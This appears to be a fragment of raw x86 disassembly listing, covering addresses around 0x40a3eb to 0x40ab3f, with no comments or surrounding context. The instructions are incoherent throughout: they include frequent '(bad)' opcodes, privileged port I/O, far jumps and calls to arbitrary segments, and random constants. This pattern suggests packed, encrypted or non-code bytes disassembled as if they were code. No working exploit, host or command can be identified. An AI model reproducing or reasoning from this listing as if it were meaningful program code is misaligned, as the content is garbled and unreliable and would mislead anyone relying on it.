  40a3eb:	dec    esi
  40a3ec:	mov    WORD PTR [edi+0x4e548763],?
  40a3f2:	fst    DWORD PTR [esi+0x7b]
  40a3f5:	(bad)  
  40a3f6:	retf   
  40a3f7:	(bad)  
  40a3f8:	int3   
  40a3f9:	dec    edi
  40a3fa:	fs dec ecx
  40a3fc:	fist   WORD PTR [esi+0x61a6791]
  40a402:	dec    eax
  40a403:	cmp    BYTE PTR [edx],dh
  40a405:	in     eax,0x4e
  40a407:	in     eax,dx
  40a408:	das    
  40a409:	xor    ch,BYTE PTR [edx-0x1f686eb7]
  40a40f:	outs   dx,DWORD PTR ds:[esi]
  40a410:	imul   ebp,DWORD PTR [edi],0x6d
  40a413:	xchg   DWORD PTR [edi+0x6f],ebx
  40a416:	push   esp
  40a417:	xchg   edi,eax
  40a418:	pop    ecx
  40a419:	adc    al,0xcd
  40a41b:	push   edi
  40a41c:	and    DWORD PTR [edx+0x4c],ebx
  40a41f:	inc    esp
  40a420:	(bad)  
  40a421:	jmp    0x23d8:0x4806be30
  40a428:	daa    
  40a429:	and    BYTE PTR [edi],0x3a
  40a42c:	xlat   BYTE PTR ds:[ebx]
  40a42d:	in     al,0xc7
  40a42f:	(bad)  
  40a430:	jmp    FWORD PTR [ebp-0x5b]
  40a433:	ins    BYTE PTR es:[edi],dx
  40a434:	xchg   BYTE PTR [edi+0x58],ah
  40a437:	(bad)  
  40a438:	int    0x26
  40a43a:	mov    ecx,0xc315ddee
  40a43f:	jmp    0x88b8:0xcfa281f6
  40a446:	xor    bh,BYTE PTR [eax-0x13]
  40a449:	(bad)  
  40a44a:	jg     0x40a429
  40a44c:	inc    esp
  40a44d:	repnz lea edi,[ecx-0x7d]
  40a451:	mov    eax,0x6891e536
  40a456:	add    esi,DWORD PTR [ebx+eax*1+0x75]
  40a45a:	xchg   esi,eax
  40a45b:	pop    ebx
  40a45c:	mov    dh,0x41
  40a45e:	and    DWORD PTR [eax+0x10],esi
  40a461:	sbb    bl,ch
  40a463:	lds    esp,FWORD PTR [ebx]
  40a465:	das    
  40a466:	mov    esp,eax
  40a468:	mov    esp,0x11ac847d
  40a46d:	aas    
  40a46e:	stos   DWORD PTR es:[edi],eax
  40a46f:	sbb    al,BYTE PTR [edx-0x7a4bc6c2]
  40a475:	mov    al,ds:0x70f828c7
  40a47a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a47b:	cdq    
  40a47c:	int    0x70
  40a47e:	int3   
  40a47f:	cwde   
  40a480:	psubd  mm6,QWORD PTR [edi]
  40a483:	mov    esi,0xb352ba5b
  40a488:	hlt    
  40a489:	sub    dh,bl
  40a48b:	push   ds
  40a48c:	sbb    esi,DWORD PTR [eax]
  40a48e:	sub    dh,dl
  40a490:	aaa    
  40a491:	rcr    ah,cl
  40a493:	jbe    0x40a426
  40a495:	sub    cl,BYTE PTR [eax]
  40a497:	push   esi
  40a498:	push   ebp
  40a499:	loopne 0x40a4c6
  40a49b:	retf   0xf1a5
  40a49e:	pop    edx
  40a49f:	inc    ebx
  40a4a0:	sar    DWORD PTR [ebp+0x2e8cce15],cl
  40a4a6:	lahf   
  40a4a7:	mov    eax,ds:0x8048eef7
  40a4ac:	and    DWORD PTR [eax],0xffffffe3
  40a4af:	pop    esi
  40a4b0:	mov    ds,ebp
  40a4b2:	popf   
  40a4b3:	loopne 0x40a4b4
  40a4b5:	push   edx
  40a4b6:	stos   BYTE PTR es:[edi],al
  40a4b7:	loop   0x40a466
  40a4b9:	scas   eax,DWORD PTR es:[edi]
  40a4ba:	cmp    DWORD PTR [ebp-0x5],eax
  40a4bd:	scas   eax,DWORD PTR es:[edi]
  40a4be:	xchg   esp,eax
  40a4bf:	jle    0x40a4aa
  40a4c1:	add    BYTE PTR [esi-0x39],bh
  40a4c4:	stos   DWORD PTR es:[edi],eax
  40a4c5:	and    BYTE PTR [edi-0x32436f21],0x84
  40a4cc:	clc    
  40a4cd:	mov    esp,0x6790cc64
  40a4d2:	fs in  eax,dx
  40a4d4:	mov    esi,0xdd593d2e
  40a4d9:	jae    0x40a506
  40a4db:	xchg   DWORD PTR [eax-0x6ba9712d],esi
  40a4e1:	jbe    0x40a527
  40a4e3:	xor    ecx,DWORD PTR [edx+0x7660d341]
  40a4e9:	clc    
  40a4ea:	inc    eax
  40a4eb:	push   cs
  40a4ec:	cmp    BYTE PTR ds:0x43025eff,dl
  40a4f2:	pop    ecx
  40a4f3:	out    0x38,eax
  40a4f5:	xchg   edx,eax
  40a4f6:	inc    ebp
  40a4f7:	repz and BYTE PTR [ecx+0x41],cl
  40a4fb:	fcmovb st,st(5)
  40a4fd:	sbb    eax,0x3191dfeb
  40a502:	inc    edx
  40a503:	in     al,dx
  40a504:	ret    0x1f18
  40a507:	cmc    
  40a508:	gs pop eax
  40a50a:	and    bh,dl
  40a50c:	dec    esp
  40a50d:	(bad)  
  40a50e:	sahf   
  40a50f:	xchg   ecx,eax
  40a510:	rcr    bh,0xb9
  40a513:	inc    esp
  40a514:	neg    esp
  40a516:	xchg   ebx,eax
  40a517:	dec    esi
  40a518:	pop    es
  40a519:	cmp    BYTE PTR [ebx],bl
  40a51b:	scas   al,BYTE PTR es:[edi]
  40a51c:	pop    edi
  40a51d:	sti    
  40a51e:	test   ecx,0xd450d2
  40a524:	sub    ch,BYTE PTR [edi-0x3b05c1bf]
  40a52a:	out    dx,al
  40a52b:	pop    ds
  40a52c:	push   edi
  40a52d:	xor    edi,DWORD PTR [edi-0x7f97b47b]
  40a533:	mov    ds:0xf76d68ac,eax
  40a538:	int3   
  40a539:	fimul  WORD PTR [esi+0x14]
  40a53c:	retf   0x75f6
  40a53f:	aaa    
  40a540:	cmp    edi,edx
  40a542:	pop    DWORD PTR [ecx]
  40a544:	mov    eax,esi
  40a546:	das    
  40a547:	iret   
  40a548:	jne    0x40a545
  40a54a:	addr16 cmc 
  40a54c:	mov    ebp,0xcf028c9f
  40a551:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a552:	sbb    al,0x45
  40a554:	cmp    edi,DWORD PTR fs:[ecx-0x6c]
  40a558:	push   0xffffff9b
  40a55a:	sub    esi,DWORD PTR [ebp+0x62]
  40a55d:	and    al,0x86
  40a55f:	out    0xfe,eax
  40a561:	xlat   BYTE PTR ds:[ebx]
  40a562:	in     al,0xda
  40a564:	cld    
  40a565:	bound  ebp,QWORD PTR [esp-0x1c]
  40a569:	ins    DWORD PTR es:[edi],dx
  40a56a:	push   0xb17e90dd
  40a56f:	or     DWORD PTR [esi],ecx
  40a571:	into   
  40a572:	xchg   esi,eax
  40a573:	mov    dh,0x5b
  40a575:	inc    ecx
  40a576:	jp     0x40a5d0
  40a578:	and    ch,bh
  40a57a:	mov    edx,0x7222a2a4
  40a57f:	ins    BYTE PTR es:[edi],dx
  40a580:	mov    ebp,0xe3fca9ec
  40a585:	push   edi
  40a586:	push   esp
  40a587:	ds cwde 
  40a589:	jb     0x40a5c7
  40a58b:	or     cl,BYTE PTR ds:0x672dfb96
  40a591:	popa   
  40a592:	sti    
  40a593:	cmc    
  40a594:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a595:	or     BYTE PTR [esi],cl
  40a597:	sbb    DWORD PTR [esi-0xdc91236],ecx
  40a59d:	out    0x7e,al
  40a59f:	clc    
  40a5a0:	jge    0x40a549
  40a5a2:	fld    QWORD PTR [edi+ebx*8]
  40a5a5:	shl    DWORD PTR [bp+di+0x1f41],1
  40a5aa:	lahf   
  40a5ab:	pushf  
  40a5ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a5ad:	outs   dx,BYTE PTR ds:[esi]
  40a5ae:	cmp    ch,bh
  40a5b0:	or     al,0x62
  40a5b2:	jae    0x40a540
  40a5b4:	outs   dx,DWORD PTR ds:[esi]
  40a5b5:	mov    ah,0xa4
  40a5b7:	(bad)  
  40a5b9:	pusha  
  40a5ba:	retf   
  40a5bb:	test   al,0xf
  40a5bd:	xchg   esi,eax
  40a5be:	xor    BYTE PTR ds:0x1fe41022,al
  40a5c4:	xchg   esi,eax
  40a5c5:	ins    BYTE PTR es:[edi],dx
  40a5c6:	retf   0xf0a4
  40a5c9:	sbb    BYTE PTR [edx],bl
  40a5cb:	mov    fs,WORD PTR [ecx+eiz*1]
  40a5ce:	cmp    bh,BYTE PTR [esi]
  40a5d0:	in     eax,0xbc
  40a5d2:	scas   al,BYTE PTR es:[edi]
  40a5d3:	push   eax
  40a5d4:	xor    DWORD PTR [eax+0x539b7455],0x1468b31e
  40a5de:	jge    0x40a59b
  40a5e0:	pop    edi
  40a5e1:	adc    cl,BYTE PTR [esi-0x53]
  40a5e4:	iret   
  40a5e5:	jae    0x40a5f2
  40a5e7:	pop    edi
  40a5e8:	cmp    BYTE PTR [edx+0xd],al
  40a5eb:	push   edi
  40a5ec:	xchg   edx,eax
  40a5ed:	mov    ecx,0xa2c44dd3
  40a5f2:	add    BYTE PTR [ebp*1-0x5187cac8],dl
  40a5f9:	(bad)  [eax]
  40a5fb:	call   0xa84c4d08
  40a600:	das    
  40a601:	jns    0x40a662
  40a603:	enter  0x8a80,0x12
  40a607:	(bad)  [ebx]
  40a609:	fwait
  40a60a:	mov    eax,ebx
  40a60c:	mov    bl,0x55
  40a60e:	mov    ?,ecx
  40a610:	mov    dh,0xe1
  40a612:	or     eax,0x887da717
  40a617:	sub    BYTE PTR [esi+0x269b8b11],dh
  40a61d:	test   DWORD PTR [edx],esp
  40a61f:	ja     0x40a65e
  40a621:	pop    ebp
  40a622:	add    ebp,edi
  40a624:	mov    bl,0x95
  40a626:	pop    eax
  40a627:	hlt    
  40a628:	push   0x2
  40a62a:	test   eax,0x3e0a8cd8
  40a62f:	imul   edx,DWORD PTR [esi-0x39036d70],0xea2e20f5
  40a639:	mov    ds:0x1f897f2e,eax
  40a63e:	xor    bh,dh
  40a640:	loop   0x40a6a0
  40a642:	and    DWORD PTR [esi-0x2c],0xfffffffc
  40a646:	push   es
  40a647:	push   0x1d
  40a649:	xor    dh,0x6e
  40a64c:	mov    esp,0xcf5b03e4
  40a651:	lahf   
  40a652:	jl     0x40a5fd
  40a654:	outs   dx,DWORD PTR ds:[esi]
  40a655:	stos   DWORD PTR es:[edi],eax
  40a656:	mov    edx,0xd6fb507c
  40a65b:	xor    al,0x2a
  40a65d:	in     al,0x9b
  40a65f:	pop    edx
  40a660:	ror    DWORD PTR [edx],1
  40a662:	push   esp
  40a663:	mov    ebp,0x28b3e1fe
  40a668:	test   al,0x69
  40a66a:	or     ebx,esp
  40a66c:	stos   DWORD PTR es:[edi],eax
  40a66d:	jp     0x40a6c0
  40a66f:	pop    esp
  40a670:	leave  
  40a671:	out    dx,al
  40a672:	pop    esi
  40a673:	add    eax,0x7550dd37
  40a678:	pop    ss
  40a679:	repnz shl BYTE PTR [ebp+esi*4+0x253f7f1a],0x23
  40a682:	sub    al,0xa9
  40a684:	test   eax,0x717ba649
  40a689:	in     eax,dx
  40a68a:	sub    eax,0x2340e9a2
  40a68f:	ds out 0xf0,eax
  40a692:	repnz (bad) 
  40a695:	mov    esi,0xda60407c
  40a69a:	loop   0x40a6ef
  40a69c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a69d:	mov    cl,0x31
  40a69f:	arpl   dx,bx
  40a6a1:	xchg   esi,eax
  40a6a2:	sub    cl,BYTE PTR [ebx+0x7f0b7bf0]
  40a6a8:	jmp    0x5fde:0x9183b26c
  40a6af:	call   0xc10de06c
  40a6b4:	out    0x11,al
  40a6b6:	and    eax,0x8dad13d1
  40a6bb:	rol    ch,cl
  40a6bd:	jbe    0x40a659
  40a6bf:	cwde   
  40a6c0:	mov    DWORD PTR [esi+0x65236404],ebx
  40a6c6:	repz call 0xf6f4:0x839e1e1d
  40a6ce:	sbb    ebx,0x8
  40a6d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a6d2:	lock pop edx
  40a6d4:	cdq    
  40a6d5:	jns    0x40a6c9
  40a6d7:	fwait
  40a6d8:	push   0xfffffff9
  40a6da:	cmp    ch,dl
  40a6dc:	xor    BYTE PTR [eax+0x48402e5b],ch
  40a6e2:	mov    dh,0x4f
  40a6e4:	rcr    DWORD PTR [edx+0x5925a8a2],cl
  40a6ea:	retf   0xd65f
  40a6ed:	or     DWORD PTR [ecx+0x53],ebx
  40a6f0:	mov    esp,0xa7d203d1
  40a6f5:	dec    edi
  40a6f6:	add    al,0x84
  40a6f8:	loop   0x40a749
  40a6fa:	mov    ds:0x8ceacfa9,eax
  40a6ff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a700:	enter  0x2beb,0x4a
  40a704:	lods   al,BYTE PTR ds:[esi]
  40a705:	push   ebx
  40a706:	mov    ah,0x9f
  40a708:	inc    esp
  40a709:	int    0x60
  40a70b:	add    al,0xa8
  40a70d:	mov    eax,0x64319159
  40a712:	dec    ebx
  40a713:	loopne 0x40a768
  40a715:	repz int3 
  40a717:	retf   
  40a718:	mov    bl,0x8
  40a71a:	enter  0xb6da,0x97
  40a71e:	mov    al,ds:0xdf18142d
  40a723:	and    BYTE PTR [eax],al
  40a725:	fcmovb st,st(1)
  40a727:	xor    bl,cl
  40a729:	sbb    DWORD PTR [ecx-0x1],ebp
  40a72c:	enter  0x4500,0x4a
  40a730:	jle    0x40a6b8
  40a732:	sbb    DWORD PTR ds:0xb376996f,0x847e932a
  40a73c:	sti    
  40a73d:	scas   eax,DWORD PTR es:[edi]
  40a73e:	(bad)  
  40a73f:	out    dx,eax
  40a740:	inc    esi
  40a741:	pop    ss
  40a742:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  40a744:	rcr    BYTE PTR [esi+0x1322e3eb],0x85
  40a74b:	inc    edi
  40a74c:	stc    
  40a74d:	dec    ecx
  40a74e:	or     al,0x58
  40a750:	cmp    ecx,DWORD PTR [esi-0x7ce4f328]
  40a756:	inc    esi
  40a757:	out    0x2c,al
  40a759:	xchg   BYTE PTR [edi-0x3ef2027c],al
  40a75f:	lds    ebx,FWORD PTR [edi-0x42]
  40a762:	sahf   
  40a763:	fwait
  40a764:	dec    ebp
  40a765:	test   al,0x44
  40a767:	bound  ebp,QWORD PTR [esi-0x26]
  40a76a:	inc    edx
  40a76b:	fmul   st(2),st
  40a76d:	in     al,0x19
  40a76f:	fistp  DWORD PTR [ebx]
  40a771:	cwde   
  40a772:	adc    al,BYTE PTR [esi+0x6a]
  40a775:	je     0x40a73e
  40a777:	jne    0x40a763
  40a779:	fnstsw WORD PTR [edi-0x3aa0e926]
  40a77f:	xlat   BYTE PTR ds:[ebx]
  40a780:	ja     0x40a75c
  40a782:	mov    ecx,0xdcacb812
  40a787:	mov    ch,0x77
  40a789:	mov    ds:0x599ed4fe,al
  40a78e:	pop    edi
  40a78f:	add    DWORD PTR [ebp-0x6317d75e],0x4869161b
  40a799:	int3   
  40a79a:	out    dx,al
  40a79b:	(bad)  
  40a79c:	popa   
  40a79d:	popf   
  40a79e:	mov    WORD PTR [ebx+0x7e0ca9ef],?
  40a7a4:	xchg   edi,eax
  40a7a5:	fstp   DWORD PTR [ebx]
  40a7a7:	aad    0x68
  40a7a9:	(bad)  
  40a7aa:	xchg   esi,esp
  40a7ac:	out    dx,al
  40a7ad:	or     BYTE PTR [esi-0x32],dh
  40a7b0:	mov    ecx,0x7271d81e
  40a7b5:	add    DWORD PTR [edi+ebx*4+0x40f12e0d],edi
  40a7bc:	aad    0xbc
  40a7be:	mov    dh,0xe1
  40a7c0:	mov    eax,0x6c3aec93
  40a7c5:	cmc    
  40a7c6:	xor    DWORD PTR [esi-0x63],esp
  40a7c9:	push   edx
  40a7ca:	iret   
  40a7cb:	fild   WORD PTR [ebp+0x42]
  40a7ce:	mov    ch,0x23
  40a7d0:	mov    esp,0x26547352
  40a7d5:	mov    ebx,DWORD PTR [edx+ebx*4]
  40a7d8:	pop    ds
  40a7d9:	test   al,0x8a
  40a7db:	sbb    DWORD PTR [eax],eax
  40a7dd:	mov    eax,ds:0xefbfae5a
  40a7e2:	jmp    0x6c80:0x9f36e4bf
  40a7e9:	cmp    al,0xd6
  40a7eb:	mov    eax,0x51df2c41
  40a7f0:	ret    0x2fba
  40a7f3:	(bad)
  40a7f6:	and    DWORD PTR fs:[esi],eax
  40a7f9:	ret    0xcac9
  40a7fc:	jp     0x40a7db
  40a7fe:	pop    ebp
  40a7ff:	bound  ebp,QWORD PTR [ebx+esi*2+0x18]
  40a803:	cmp    eax,esp
  40a805:	mov    dl,0x1b
  40a807:	shl    eax,cl
  40a809:	imul   esp,DWORD PTR [edx],0xabf13703
  40a80f:	xchg   edx,eax
  40a810:	icebp  
  40a811:	test   cl,0xcc
  40a814:	add    BYTE PTR [ebp+0x1aa37d7e],0x6c
  40a81b:	mov    esi,0xa4c8f9c9
  40a820:	mov    eax,0xb16a621
  40a826:	clc    
  40a827:	and    eax,0x5045bb5f
  40a82c:	aas    
  40a82d:	arpl   WORD PTR [edi+0x69],bp
  40a830:	xlat   BYTE PTR ds:[ebx]
  40a831:	inc    esi
  40a832:	stos   BYTE PTR es:[edi],al
  40a833:	dec    esi
  40a834:	inc    edx
  40a835:	retf   
  40a836:	push   esi
  40a837:	jmp    0x4ac9bc92
  40a83c:	pusha  
  40a83d:	clc    
  40a83e:	test   DWORD PTR [eax],esi
  40a840:	lods   eax,DWORD PTR ds:[esi]
  40a841:	in     al,dx
  40a842:	adc    eax,edx
  40a844:	xor    al,0xfb
  40a846:	xchg   esp,eax
  40a847:	dec    ebp
  40a848:	lock xor esp,edx
  40a84b:	xor    dh,ah
  40a84d:	jmp    0x600e:0xc972912d
  40a854:	inc    edi
  40a855:	(bad)  
  40a856:	mov    dh,0x5d
  40a858:	xchg   ebx,eax
  40a859:	icebp  
  40a85a:	jnp    0x40a7fd
  40a85c:	dec    eax
  40a85d:	jmp    0xc4059506
  40a862:	jbe    0x40a7e5
  40a864:	sub    dl,BYTE PTR [ebx+0x71d2227c]
  40a86a:	xor    eax,0x4b86a45
  40a86f:	frstor [edx-0x19bc8ff5]
  40a875:	(bad)  
  40a876:	les    esp,FWORD PTR [esi]
  40a878:	aam    0xd0
  40a87a:	push   ebx
  40a87b:	imul   esi,DWORD PTR [ecx+0x6e531ce9],0x32
  40a882:	adc    bh,BYTE PTR [edx+esi*4-0x6976ec55]
  40a889:	push   ecx
  40a88a:	add    eax,0x3c6bc04e
  40a88f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a890:	test   DWORD PTR [eax+ebp*8],ebx
  40a893:	mov    ch,0x69
  40a895:	nop
  40a896:	lock fbstp TBYTE PTR [eax+0x6fd04c7e]
  40a89d:	adc    ebx,edi
  40a89f:	(bad)  
  40a8a1:	enter  0xa622,0x2f
  40a8a5:	cmp    al,BYTE PTR [eax+0x3]
  40a8a8:	jmp    0x40a840
  40a8aa:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  40a8ac:	mov    dl,0x58
  40a8ae:	push   eax
  40a8af:	adc    BYTE PTR [eax+0x5a78e81b],bl
  40a8b5:	cdq    
  40a8b6:	and    al,0x1d
  40a8b8:	sub    al,0xb7
  40a8ba:	pusha  
  40a8bb:	cmp    DWORD PTR [edx+0x43],0xec66542b
  40a8c2:	inc    ebp
  40a8c3:	cmp    al,0xc0
  40a8c5:	xchg   edi,eax
  40a8c6:	test   BYTE PTR [edx+esi*2-0x6e8de1dd],0xff
  40a8ce:	add    eax,0x3a6bbd0a
  40a8d3:	call   0x47f7:0x2a061310
  40a8da:	pop    esp
  40a8db:	adc    BYTE PTR [ebp-0x486043e8],0xac
  40a8e2:	js     0x40a8d0
  40a8e4:	mov    bl,0x8f
  40a8e6:	stos   DWORD PTR es:[edi],eax
  40a8e7:	fcom   QWORD PTR [esi]
  40a8e9:	fcmovnbe st,st(4)
  40a8eb:	outs   dx,BYTE PTR ds:[esi]
  40a8ec:	cwde   
  40a8ed:	push   ss
  40a8ee:	sar    BYTE PTR [edi+0x5d],1
  40a8f1:	add    DWORD PTR [ecx+0x5c],edx
  40a8f4:	leave  
  40a8f5:	cmp    BYTE PTR [eax+0x2a],ah
  40a8f8:	dec    edx
  40a8f9:	mov    esi,0xa8a49646
  40a8fe:	xchg   BYTE PTR [ecx-0x6e],al
  40a901:	mov    ?,edx
  40a903:	sbb    DWORD PTR [ecx+0x23],0xbe060841
  40a90a:	scas   al,BYTE PTR es:[edi]
  40a90b:	enter  0x37ad,0x53
  40a90f:	(bad)  
  40a910:	xlat   BYTE PTR ds:[ebx]
  40a911:	xchg   ecx,eax
  40a912:	repz test DWORD PTR [ebx],edi
  40a915:	fdivr  DWORD PTR [edi+esi*8-0x6c]
  40a919:	and    ebp,DWORD PTR [ebp-0x18]
  40a91c:	pop    esp
  40a91d:	jb     0x40a8b0
  40a91f:	pop    esi
  40a920:	jae    0x40a962
  40a922:	(bad)  
  40a923:	dec    ebp
  40a924:	jg     0x40a99b
  40a926:	repnz lods eax,DWORD PTR ds:[esi]
  40a928:	pop    ebp
  40a929:	popa   
  40a92a:	loopne 0x40a91f
  40a92c:	sbb    al,0xd1
  40a92e:	mov    cl,BYTE PTR [edi]
  40a930:	leave  
  40a931:	xor    BYTE PTR [eax-0x63e02d60],al
  40a937:	inc    edi
  40a938:	xor    bh,al
  40a93a:	sbb    ebp,DWORD PTR [ecx-0x65]
  40a93d:	das    
  40a93e:	and    DWORD PTR [ebp+0x2c40fe18],edi
  40a944:	mov    ebp,0xe8fa63b1
  40a949:	sbb    ah,al
  40a94b:	shr    dh,0x90
  40a94e:	xlat   BYTE PTR ds:[ebx]
  40a94f:	(bad)  
  40a950:	test   DWORD PTR [ebp-0x52],0x7ecb9b6f
  40a957:	repnz pop ss
  40a959:	or     al,0xbb
  40a95b:	popa   
  40a95c:	(bad)  
  40a95d:	mov    edi,0x7ea2f76c
  40a962:	mov    edi,0xb21ff7cd
  40a967:	and    al,0x15
  40a969:	lea    eax,[edx+0x4befb541]
  40a96f:	hlt    
  40a970:	aam    0xf1
  40a972:	(bad)  
  40a973:	arpl   WORD PTR [edx],di
  40a975:	adc    ah,BYTE PTR [ebx]
  40a977:	xchg   esi,eax
  40a978:	pop    ebp
  40a979:	dec    ecx
  40a97a:	mov    edx,0xa14c02ed
  40a97f:	fwait
  40a980:	imul   eax,DWORD PTR [edi+0x7b0a9a5d],0xabe34a0a
  40a98a:	cwde   
  40a98b:	sti    
  40a98c:	(bad)  
  40a98d:	xchg   esp,eax
  40a98e:	mov    cl,BYTE PTR [edi]
  40a990:	sbb    edi,eax
  40a992:	jo     0x40a94a
  40a994:	push   ebx
  40a995:	jp     0x40a9dd
  40a997:	mov    eax,DWORD PTR [eax]
  40a999:	mov    al,ds:0x570d5d71
  40a99e:	pop    ss
  40a99f:	push   0xa8e07cfa
  40a9a4:	outs   dx,DWORD PTR ds:[esi]
  40a9a5:	jne    0x40a958
  40a9a7:	xor    DWORD PTR [eax-0x41111c06],ecx
  40a9ad:	sbb    ah,dl
  40a9af:	mov    WORD PTR [edi+0x64],ss
  40a9b2:	pop    edx
  40a9b3:	scas   eax,DWORD PTR es:[edi]
  40a9b4:	sbb    esi,DWORD PTR [edx]
  40a9b6:	jmp    0x76b:0x54e993fd
  40a9bd:	rol    DWORD PTR [edx+0x69],1
  40a9c0:	mov    esi,DWORD PTR [edi]
  40a9c2:	(bad)  
  40a9c3:	lahf   
  40a9c4:	pop    ebp
  40a9c5:	or     al,0x7d
  40a9c7:	mov    ah,ah
  40a9c9:	jo     0x40aa41
  40a9cb:	jo     0x40aa1e
  40a9cd:	adc    BYTE PTR [edi+0x643135a],0x95
  40a9d4:	xlat   BYTE PTR ds:[ebx]
  40a9d5:	lea    edi,[edx]
  40a9d7:	cmp    DWORD PTR [ecx+0x174c4fbb],esp
  40a9dd:	sbb    DWORD PTR [ecx-0x5c],ecx
  40a9e0:	xchg   ecx,eax
  40a9e1:	(bad)  
  40a9e2:	jo     0x40a984
  40a9e4:	or     al,BYTE PTR ds:[ebx-0x7b899da0]
  40a9eb:	mov    bl,0x80
  40a9ed:	(bad)  
  40a9ef:	clc    
  40a9f0:	cmp    dh,bh
  40a9f2:	(bad)  [ebx]
  40a9f4:	pop    esi
  40a9f5:	push   ss
  40a9f6:	lea    edx,[edx]
  40a9f8:	sub    bh,BYTE PTR [eax]
  40a9fa:	cli    
  40a9fb:	ins    BYTE PTR es:[edi],dx
  40a9fc:	push   ebx
  40a9fd:	and    BYTE PTR [esi],0x64
  40aa00:	jecxz  0x40aa36
  40aa02:	pop    ebp
  40aa03:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40aa04:	and    esp,DWORD PTR ds:0x980578f9
  40aa0a:	inc    eax
  40aa0b:	add    BYTE PTR [eax-0x17],0xfc
  40aa0f:	arpl   WORD PTR [esi],cx
  40aa11:	push   0xffffffa5
  40aa13:	out    0x53,eax
  40aa15:	loope  0x40a99b
  40aa17:	repnz pop ds
  40aa19:	pushf  
  40aa1a:	dec    esp
  40aa1b:	pop    esp
  40aa1c:	pop    ecx
  40aa1d:	or     al,0x27
  40aa1f:	xor    BYTE PTR [eax],ch
  40aa21:	ror    DWORD PTR [edi+eax*8+0x39e3224f],0x7c
  40aa29:	dec    ecx
  40aa2a:	aad    0xb8
  40aa2c:	out    0x60,eax
  40aa2e:	in     al,0x3
  40aa30:	lods   eax,DWORD PTR ds:[esi]
  40aa31:	test   dh,bl
  40aa33:	mov    ds:0x20433c0b,eax
  40aa38:	inc    edx
  40aa39:	mov    eax,gs
  40aa3b:	test   eax,0xa2420ca3
  40aa40:	mov    esi,0xd86fa576
  40aa45:	scas   al,BYTE PTR es:[edi]
  40aa46:	ins    DWORD PTR es:[edi],dx
  40aa47:	pop    ebp
  40aa48:	inc    edx
  40aa49:	and    bl,0x36
  40aa4c:	xchg   esp,eax
  40aa4d:	and    bl,al
  40aa4f:	mov    al,0x85
  40aa51:	xchg   esi,eax
  40aa52:	test   BYTE PTR [edi],ah
  40aa54:	ficom  WORD PTR [edx+0x44]
  40aa57:	into   
  40aa58:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40aa59:	cmp    DWORD PTR [eax*1+0x49a6d27d],ecx
  40aa60:	ror    BYTE PTR [eax+ebx*2],1
  40aa63:	fcomp  st(5)
  40aa65:	mov    esi,0x6aab08ca
  40aa6a:	ret    0x7b7e
  40aa6d:	or     ah,dh
  40aa6f:	stos   DWORD PTR es:[edi],eax
  40aa70:	in     al,0x5
  40aa72:	jo     0x40aadd
  40aa74:	sub    edi,DWORD PTR [ecx]
  40aa76:	ins    DWORD PTR es:[edi],dx
  40aa77:	outs   dx,BYTE PTR ds:[esi]
  40aa78:	inc    BYTE PTR [edi-0x25]
  40aa7b:	dec    ebp
  40aa7c:	lea    ebp,[ebx+0x69653757]
  40aa82:	stc    
  40aa83:	sub    eax,0x945c64bf
  40aa88:	fbstp  TBYTE PTR [ecx-0xa]
  40aa8b:	stc    
  40aa8c:	clc    
  40aa8d:	aam    0xfa
  40aa8f:	and    cl,dh
  40aa91:	push   edi
  40aa92:	mov    ecx,0x5561ecb2
  40aa97:	mov    ch,0x96
  40aa99:	push   edx
  40aa9a:	dec    ebx
  40aa9b:	ror    DWORD PTR ds:0x691a1ff8,cl
  40aaa1:	dec    esi
  40aaa2:	mov    al,ds:0xddccfbbf
  40aaa7:	(bad)  
  40aaa8:	(bad)  
  40aaa9:	mov    ah,0x4d
  40aaab:	scas   eax,DWORD PTR es:[edi]
  40aaac:	imul   ebp,DWORD PTR [edi-0x72820619],0x38f215f4
  40aab6:	lods   eax,DWORD PTR ds:[esi]
  40aab7:	sub    esp,eax
  40aab9:	retf   
  40aaba:	nop
  40aabb:	cmc    
  40aabc:	mov    bl,0x51
  40aabe:	dec    ebp
  40aabf:	or     BYTE PTR [ebx-0x6f],bl
  40aac2:	xchg   edi,ebp
  40aac4:	jb     0x40aa88
  40aac6:	xchg   edx,eax
  40aac7:	dec    esp
  40aac8:	sub    al,0x25
  40aaca:	cs std 
  40aacc:	mov    esi,0xf60fb984
  40aad1:	ffree  st(4)
  40aad3:	popa   
  40aad4:	ds xchg ecx,eax
  40aad6:	fisub  WORD PTR [esi]
  40aad8:	loop   0x40aad3
  40aada:	ror    DWORD PTR [eax-0x6],0x3c
  40aade:	ficomp DWORD PTR [ebp-0x31cfe255]
  40aae4:	pop    ebp
  40aae5:	adc    al,0x84
  40aae7:	call   0xc5f7:0x4bb1a4cd
  40aaee:	cmc    
  40aaef:	popa   
  40aaf0:	arpl   cx,cx
  40aaf2:	retf   
  40aaf3:	pusha  
  40aaf4:	push   ebp
  40aaf5:	mov    al,ds:0xd57246c4
  40aafa:	sbb    al,0xf0
  40aafc:	sbb    al,0xbc
  40aafe:	mov    BYTE PTR [esi+0x13],dl
  40ab01:	gs enter 0xaf43,0xba
  40ab06:	repz (bad) 
  40ab09:	add    ebx,DWORD PTR [ebp-0xf]
  40ab0c:	ss dec ecx
  40ab0e:	enter  0xe022,0xa2
  40ab12:	icebp  
  40ab13:	fiadd  DWORD PTR [eax+0x650d4e0e]
  40ab19:	call   0x4047:0x69df521f
  40ab20:	aad    0x3a
  40ab22:	jge    0x40aab0
  40ab24:	jb     0x40aaa6
  40ab26:	popf   
  40ab27:	popf   
  40ab28:	icebp  
  40ab29:	dec    esi
  40ab2a:	enter  0xbc03,0x88
  40ab2e:	or     eax,DWORD PTR [ecx-0x33b29200]
  40ab34:	mov    bl,0x88
  40ab36:	push   ds
  40ab37:	pop    esp
  40ab38:	sbb    BYTE PTR [ebp+0x78],0xa8
  40ab3c:	fbstp  TBYTE PTR [ecx]
  40ab3e:	push   cs
  40ab3f:	retf   
